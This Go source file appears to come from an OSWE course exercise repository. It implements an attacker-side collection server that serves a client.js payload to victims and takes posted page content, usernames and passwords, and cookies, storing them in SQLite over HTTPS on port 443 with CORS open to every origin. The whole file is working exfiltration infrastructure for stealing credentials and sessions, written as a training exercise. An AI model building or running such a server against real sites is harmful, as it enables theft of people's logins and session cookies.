package main

import (
	"crypto/tls"
	"fmt"
	"log"
	"net/http"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"

	"github.com/iPhantasmic/OSWE/scripts/utils"
)

// Chp 10.6.4 - Creating the API
func health(c *gin.Context) {
	c.String(http.StatusOK, "Hello, all is well!")
}

func clientJS(c *gin.Context) {
	c.FileAttachment("./client.js", "client.js")
}

// Ex 10.6.4.1 - POST API
func uploadContent(c *gin.Context) {
	content := c.PostForm("content")
	url := c.PostForm("url")

	utils.PrintInfo(fmt.Sprintf("Saving to DB for URL: %s", url))
	newId := InsertContent(url, content)
	if newId == 0 {
		c.String(http.StatusInternalServerError, "Failed to save new content...")
	}

	utils.PrintSuccess(fmt.Sprintf("Saved to DB for URL: %s", url))
	c.String(http.StatusCreated, "Content for URL: %s saved to %d", url, newId)
}

// Ex 10.6.4.2 - Extra Mile: API to save Credentials and Cookies
func uploadCredential(c *gin.Context) {
	user := c.PostForm("user")
	pass := c.PostForm("pass")

	utils.PrintInfo(fmt.Sprintf("Saving to DB for user: %s", user))
	newId := InsertCredential(user, pass)
	if newId == 0 {
		c.String(http.StatusInternalServerError, "Failed to save new credential...")
	}

	utils.PrintSuccess(fmt.Sprintf("Saved to DB for credential: %s", user))
	c.String(http.StatusCreated, "User: %s saved to %d", user, newId)
}

func uploadCookie(c *gin.Context) {
	key := c.PostForm("key")
	value := c.PostForm("value")

	utils.PrintInfo(fmt.Sprintf("Saving to DB for cookie: %s", key))
	newId := InsertCookie(key, value)
	if newId == 0 {
		c.String(http.StatusInternalServerError, "Failed to save new cookie...")
	}

	utils.PrintSuccess(fmt.Sprintf("Saved to DB for cookie: %s", key))
	c.String(http.StatusCreated, "Cookie: %s saved to %d", key, newId)
}

func main() {
	// connect to DB and setup tables
	utils.ConnectDB("./sqlite.db")
	CreateContentTable()
	CreateCredentialTable()
	CreateCookieTable()

	r := gin.Default()

	// apply middleware
	r.Use(gin.Logger())
	r.Use(gin.Recovery())
	r.Use(cors.Default()) // CORS allow all

	// define routes and corresponding handlers
	r.GET("/health", health)
	r.GET("/client.js", clientJS)

	r.POST("/content", uploadContent)
	r.POST("/credential", uploadCredential)
	r.POST("/cookie", uploadCookie)

	// load SSL certificate and key
	certFile := "cert.pem"
	keyFile := "key.pem"

	tlsCert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		log.Fatalln("Failed to load certificate: ", err)
	}

	// create TLS configuration
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{tlsCert},
	}

	// create HTTP server with TLS configuration
	server := &http.Server{
		Addr:      ":443",
		Handler:   r, // gin router
		TLSConfig: tlsConfig,
	}

	// start the HTTPS server
	err = server.ListenAndServeTLS("", "")
	if err != nil {
		log.Fatal(err)
	}
}
